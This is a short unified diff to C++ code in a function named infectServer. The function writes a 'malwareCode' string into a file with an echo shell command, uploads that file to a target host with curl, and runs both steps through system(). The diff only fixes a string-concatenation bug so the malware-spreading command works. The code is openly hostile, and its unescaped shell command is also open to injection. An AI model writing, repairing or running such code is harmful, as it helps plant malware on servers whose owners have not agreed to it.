@@ -27,7 +27,7 @@ void infectServer(const std::string& target) {
                              std::istreambuf_iterator<char>());
 
     std::string command = "echo '" + malwareCode + "' > " + MALWARE_FILE_NAME;
-    command += " && curl -X POST -F 'file=@" + MALWARE_FILE_NAME + "' " + target;
+    command += " && curl -X POST -F 'file=@" + std::string(MALWARE_FILE_NAME) + "' " + target;
 
     system(command.c_str());
 }
